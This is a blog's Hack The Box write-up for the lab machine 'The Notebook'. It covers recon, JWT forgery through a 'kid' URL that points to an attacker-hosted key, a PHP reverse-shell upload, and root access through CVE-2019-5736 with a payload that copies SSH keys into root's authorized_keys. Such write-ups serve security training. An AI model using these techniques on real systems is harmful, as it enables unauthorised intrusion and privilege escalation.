<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="
  



  External Recon
  #

We start our external recon with an nmap scan. Only two ports are open with a third one filtered.
nmap -sC -sV -oN inital 10.10.10.230

PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 86:df:10:fd:27:a3:fb:d8:36:a7:ed:90:95:33:f5:bf (RSA)
|   256 e7:81:d6:6c:df:ce:b7:30:03:91:5c:b5:13:42:06:44 (ECDSA)
|_  256 c6:06:34:c7:fc:00:c4:62:06:c2:36:0e:ee:5e:bf:6b (ED25519)
80/tcp    open     http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: The Notebook - Your Note Keeper
10010/tcp filtered rxapi
The most interessting service so far is http on port 80. Let&rsquo;s take a peek there.">
<meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff">
<meta name="theme-color" media="(prefers-color-scheme: dark)" content="#343a40">
<meta name="color-scheme" content="light dark"><meta property="og:url" content="https://www.tagnull.de/docs/HTB-Writeups/the-notebook/">
  <meta property="og:site_name" content="www.tagnull.de">
  <meta property="og:title" content="The Notebook">
  <meta property="og:description" content="External Recon # We start our external recon with an nmap scan. Only two ports are open with a third one filtered.
nmap -sC -sV -oN inital 10.10.10.230 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 86:df:10:fd:27:a3:fb:d8:36:a7:ed:90:95:33:f5:bf (RSA) | 256 e7:81:d6:6c:df:ce:b7:30:03:91:5c:b5:13:42:06:44 (ECDSA) |_ 256 c6:06:34:c7:fc:00:c4:62:06:c2:36:0e:ee:5e:bf:6b (ED25519) 80/tcp open http nginx 1.14.0 (Ubuntu) |_http-server-header: nginx/1.14.0 (Ubuntu) |_http-title: The Notebook - Your Note Keeper 10010/tcp filtered rxapi The most interessting service so far is http on port 80. Letâ€™s take a peek there.">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="docs">
    <meta property="article:published_time" content="2021-07-31T00:00:00+00:00">
    <meta property="article:modified_time" content="2021-07-31T00:00:00+00:00">
<title>The Notebook | www.tagnull.de</title>
<link rel="manifest" href="/manifest.json">
<link rel="icon" href="/logo.png" >
<link rel="canonical" href="https://www.tagnull.de/docs/HTB-Writeups/the-notebook/">
<link rel="stylesheet" href="/book.min.aaab74181c6b1b4045b90f1cce4aaa1631e06c4b04ec2890a00c5723953b070a.css" integrity="sha256-qqt0GBxrG0BFuQ8czkqqFjHgbEsE7CiQoAxXI5U7Bwo=" crossorigin="anonymous">
  <script defer src="/fuse.min.js"></script>
  <script defer src="/en.search.min.630e0d5311b0aaef94066d137443d6f034ede58bc33ceba42326d2e70c81bf1a.js" integrity="sha256-Yw4NUxGwqu&#43;UBm0TdEPW8DTt5YvDPOukIybS5wyBvxo=" crossorigin="anonymous"></script>
<!--
Made with Book Theme
https://github.com/alex-shpak/hugo-book
-->
  
</head>
<body dir="ltr">
  <input type="checkbox" class="hidden toggle" id="menu-control" />
  <input type="checkbox" class="hidden toggle" id="toc-control" />
  <main class="container flex">
    <aside class="book-menu">
      <div class="book-menu-content">
        
  <nav>
<h2 class="book-brand">
  <a class="flex align-center" href="/"><img src="/logo.png" alt="Logo" /><span>www.tagnull.de</span>
  </a>
</h2>


<div class="book-search hidden">
  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
  <div class="book-search-spinner hidden"></div>
  <ul id="book-search-results"></ul>
</div>
<script>document.querySelector(".book-search").classList.remove("hidden")</script>












  



  
  <ul>
    
      
        <li class="book-section-flat" >
          
  
  

  
    <input type="checkbox" id="section-68dfdd1925e75eeba80f6314fba9409f" class="toggle" checked />
    <label for="section-68dfdd1925e75eeba80f6314fba9409f" class="flex justify-between">
      <a role="button" class="">HTB Writeups</a>
    </label>
  

          
  <ul>
    
      
        <li>
          
  
  

  
    <a href="/docs/HTB-Writeups/bountyhunter/" class="">BountyHunter</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/HTB-Writeups/cap/" class="">Cap</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/HTB-Writeups/the-notebook/" class="active">The Notebook</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/HTB-Writeups/traceback/" class="">Traceback</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/HTB-Writeups/safe/" class="">Safe</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/HTB-Writeups/fortune/" class="">Fortune</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/HTB-Writeups/onetwoseven/" class="">OneTwoSeven</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/HTB-Writeups/querier/" class="">Querier</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/HTB-Writeups/irked/" class="">Irked</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/HTB-Writeups/stratosphere/" class="">Stratosphere</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/HTB-Writeups/access/" class="">Access</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/HTB-Writeups/ypuffy/" class="">Ypuffy</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/HTB-Writeups/secnotes/" class="">SecNotes</a>
  

        </li>
      
    
  </ul>

        </li>
      
    
      
        <li class="book-section-flat" >
          
  
  

  
    <input type="checkbox" id="section-a371b3bebcf42b304463ef71f0bf4c99" class="toggle"  />
    <label for="section-a371b3bebcf42b304463ef71f0bf4c99" class="flex justify-between">
      <a role="button" class="">Exploit Development</a>
    </label>
  

          
  <ul>
    
      
        <li>
          
  
  

  
    <a href="/docs/Exploit-Development/stack-overflow/" class="">Stack Overflow</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/Exploit-Development/ret2plt/" class="">ret2plt</a>
  

        </li>
      
    
  </ul>

        </li>
      
    
      
        <li class="book-section-flat" >
          
  
  

  
    <input type="checkbox" id="section-e0a66dbcb0778aef460847a6ca8d2295" class="toggle"  />
    <label for="section-e0a66dbcb0778aef460847a6ca8d2295" class="flex justify-between">
      <a role="button" class="">Blog</a>
    </label>
  

          
  <ul>
    
      
        <li>
          
  
  

  
    <a href="/docs/Blog/oscp-review/" class="">OSCP Review</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/Blog/gettinghashes/" class="">NTLM Hashes via GPO redirect</a>
  

        </li>
      
    
  </ul>

        </li>
      
    
  </ul>















</nav>




  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>


 
      </div>
    </aside>

    <div class="book-page">
      <header class="book-header">
        
  <div class="flex align-center justify-between">
  <label for="menu-control">
    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
  </label>

  <strong>The Notebook</strong>

  <label for="toc-control">
    
  </label>
</div>


  
 
      </header>

      
      
  <article class="markdown book-article"><p align="center">
  <img src="notebook-banner.png" />
</p>
<hr>
<h1 id="external-recon">
  External Recon
  <a class="anchor" href="#external-recon">#</a>
</h1>
<p>We start our external recon with an nmap scan. Only two ports are open with a third one filtered.</p>
<pre tabindex="0"><code>nmap -sC -sV -oN inital 10.10.10.230

PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 86:df:10:fd:27:a3:fb:d8:36:a7:ed:90:95:33:f5:bf (RSA)
|   256 e7:81:d6:6c:df:ce:b7:30:03:91:5c:b5:13:42:06:44 (ECDSA)
|_  256 c6:06:34:c7:fc:00:c4:62:06:c2:36:0e:ee:5e:bf:6b (ED25519)
80/tcp    open     http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: The Notebook - Your Note Keeper
10010/tcp filtered rxapi
</code></pre><p>The most interessting service so far is http on port 80. Let&rsquo;s take a peek there.</p>
<p>
  <img src="website-inital.png" alt="website-inital.png" /></p>
<p>Looks like an app to take notes. We could try to bruteforce the login page. But I would rather explore the app first. Let&rsquo;s register an account.</p>
<h1 id="explore">
  Explore
  <a class="anchor" href="#explore">#</a>
</h1>
<p>Once the account has been created we can explore the various parts of the webapp and create notes. I even tried some simple injections with
single quotes etc. but the app seems not vulnerable to those attacks.</p>
<p>Let&rsquo;s check how the application handles authentication. F12 to open the developer tools of the browser and check the storage tab where our access tokens are stored.</p>
<p>
  <img src="auth.png" alt="auth.png" /></p>
<p>First thing I notice is the &ldquo;auth&rdquo; token. It starts with <code>eyJ</code> and this is indicative for &ldquo;JWT-Tokens&rdquo;. 
  <a href="https://dinochiesa.github.io/jwt/">This page</a> has a nice decoder.</p>
<p>
  <img src="jwt-decoded.png" alt="jwt-decoded.png" /></p>
<p>On the top-right we can see the header. And it already leaked some interessting information. The parameter <code>kid</code> or <code>key-id</code> holds the information about the private-key used to sign this token.</p>
<p>On the bottom-right we see our login data. And as the <code>admin_cap</code> paramater states, we are not an admin. We would like to change that though.
We can edit the token and change the 0 to a 1. But that would invalidate the signature. At least if the application in the backend checkes the signature. After playing with the token a bit, it seemed like it does check the signature. So we have to find a way to sign the token with a valid key.</p>
<p>Maybe the application allows us to inject our own value in the <code>kid</code> parameter. This way we could host a webserver with our own keys, which we would use to sign our forged token.</p>
<h1 id="exploit">
  Exploit
  <a class="anchor" href="#exploit">#</a>
</h1>
<p>Let&rsquo;s start with a proof of concept. We will change the <code>kid</code> parameter (you can use the website above) to our IP and start a webserver with <code>python3 -m http.server 7070</code> and see if we get a request from the server.
Then copy the changed token into your browser.</p>
<p>
  <img src="poc.png" alt="poc.png" /></p>
<p>Fantastic. The webserver tried to verify the key by following the outbound url. Let&rsquo;s now change the <code>admin_cap</code> parameter to <code>1</code>. If you used the site above, it already created a key-pair for you.
Just take the public key and save it in your web-root so that the webrequest from the server can read it. At the end of this writeup, I&rsquo;ll show you an alternative way of forging that token.</p>
<p>Once you&rsquo;re done with the setup and hit refresh in your browser, you should get access to the admin-panel and you should be able to read all notes.</p>
<p>
  <img src="admin-panel.png" alt="admin-panel.png" /></p>
<p>The admin panel itself gives you an option to upload a file. We could try to upload a php reverse shell on the box to get in.
The notes even tell you that there&rsquo;s a &ldquo;problem&rdquo; that php files are being executed. The fix is pending. So, this has to be the way in.</p>
<p>Let&rsquo;s grab a good 
  <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">php-reverse shell</a> and open a netcat listener.
Don&rsquo;t stop your webserver just yet. It&rsquo;s still needed to stay authenticated.</p>
<p>
  <img src="low-shell.png" alt="low-shell.png" /></p>
<p>We have a shell. Let&rsquo;s upgrade our shell to a propper tty with <code>python3 -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'</code> then <code>ctrl-z</code> to background the shell. Then type <code>stty raw -echo</code> and hit enter
followed by <code>fg</code> and enter twice. Now you should be back. Last step is <code>export TERM=xterm</code>.</p>
<h1 id="internal-recon">
  Internal Recon
  <a class="anchor" href="#internal-recon">#</a>
</h1>
<p>Now that we are in, we need to find a way to escalate our privileges. A look into <code>/etc/passwd</code> reveals a user named &ldquo;noah&rdquo;. We&rsquo;ve seen this name in the notes on the website before.
He just managed to setup his backup. With <code>find / -type d -name &quot;*backup*&quot;</code> we can search for a folder named &ldquo;backup&rdquo; and will show a folder where we have access to: <code>/var/backups</code>.</p>
<p>In there is a tar.gz backup of noah home directory. We will copy it to <code>/tmp</code> and unpack with <code>tar -xvzf</code>. Inside we find a noahs ssh-key. A quick <code>chmod 600</code> on it is enough to make it work for us.</p>
<p>
  <img src="ssh.png" alt="ssh.png" /></p>
<p>Here we also find the user.txt.</p>
<h1 id="privilege-escalation">
  Privilege Escalation
  <a class="anchor" href="#privilege-escalation">#</a>
</h1>
<p>Now it&rsquo;s time dig deeper and find a way to get root. Let&rsquo;s start with the basics: <code>sudo -l</code>.</p>
<p>
  <img src="sudo.png" alt="sudo.png" /></p>
<p>We can run a single command as sudo without password. In this case a <code>docker</code> command.
Run <code>docker --version</code> to check which docker version is installed:</p>
<pre tabindex="0"><code>Docker version 18.06.0-ce, build 0ffa825
</code></pre><p>This is an old version. After a small google search we can assume this docker version is vulnerable against <code>CVE-2019-5736</code>.
I picked 
  <a href="https://github.com/Frichetten/CVE-2019-5736-PoC">this exploit</a>, mainly because it&rsquo;s easy to edit and compile.</p>
<p>To set it up we clone the git repo to our box. Then we need to change the exploit to fit our needs.
The exploit, as is, will copy the /etc/shadow file and make it readable. But this is not what we want. We can copy the authorized_keys file from noah in the home directory of root.</p>
<p>So changing the payload to this should do the trick.</p>
<p><code>var payload = &quot;#!/bin/bash \n cat /home/noah/.ssh/authorized_keys &gt;&gt; /root/.ssh/authorized_keys&quot;</code></p>
<p>We compile the exploit with <code>go build main.go</code> and rename the binary from <code>main</code> to <code>exploit</code>.</p>
<p>Now, for this to work you need three terminals. In the first one you need to get into the docker container via <code>sudo /usr/bin/docker exec -it webapp-dev01 /bin/bash</code>.
Here you will grab your exploit via <code>wget</code> from your local python webserver and <code>chmod +x</code> and launch it via <code>./exploit</code>.</p>
<p>In the second terminal windows you will ssh into the box with noah again and then trigger the exploit via <code>sudo /usr/bin/docker exec -it webapp-dev01 /bin/sh</code>.</p>
<p>In the third window you can now try to ssh into the box as root with the rsa key of noah. The following screenshot shows this setup after the exploit
successfully triggered.</p>
<p>
  <img src="root.png" alt="root.png" /></p>
<p>And that&rsquo;s it. We&rsquo;ve rooted a medium difficulty machine once again.</p>
<h1 id="bonus-content">
  Bonus Content
  <a class="anchor" href="#bonus-content">#</a>
</h1>
<p>As promissed here&rsquo;s an alternative way to mess with the token. First we need to create a key-pair with ssh-keygen.</p>
<pre tabindex="0"><code>ssh-keygen -t rsa -b 4096 -m PEM -f jwt.key
</code></pre><p>Then we get a copy of the 
  <a href="https://github.com/ticarpi/jwt_tool">jwt-tool</a>.</p>
<p>Which in turn can be used to edit and sign the token.</p>
<pre tabindex="0"><code>python3 jwt_tool.py [eyJ0eXAiOiJKV1QiLCJhbG..snip..] -I -hc kid -hv &#34;http://10.10.16.4:7070/jwt.pub&#34; -pc admin_cap -pv 1 -S rs256 -pr jwt.key
</code></pre><p>You can do a lot of more things with jwt_tool. But that&rsquo;s another topic.</p>
<p>Have a nice one.</p>
<p>x41</p>
</article>
 
      

      <footer class="book-footer">
        
  <div class="flex flex-wrap justify-between">





</div>



  <script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script>


 
        
      </footer>

      
  
 

      <label for="menu-control" class="hidden book-menu-overlay"></label>
    </div>

    
  </main>

  
</body>
</html>












